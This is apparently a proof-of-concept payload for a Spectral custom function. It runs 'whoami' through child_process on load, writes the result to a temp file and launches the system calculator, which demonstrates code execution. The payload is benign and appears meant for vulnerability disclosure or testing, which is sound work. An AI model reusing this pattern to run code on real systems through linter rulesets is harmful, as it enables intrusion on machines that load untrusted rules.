export default () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const cp = require('child_process');

  const user = cp.execSync('whoami').toString().trim();
  const timestamp = new Date().toISOString();
  const outfile = path.join(os.tmpdir(), 'spectral-rce-poc.txt');

  fs.writeFileSync(outfile,
    `Spectral custom function executed\nTimestamp: ${timestamp}\nUser: ${user}\nPath: ${outfile}\n`);

  const calc = process.platform === 'win32' ? 'calc.exe' : 'open -a Calculator';
  cp.exec(calc);

  return [];
};
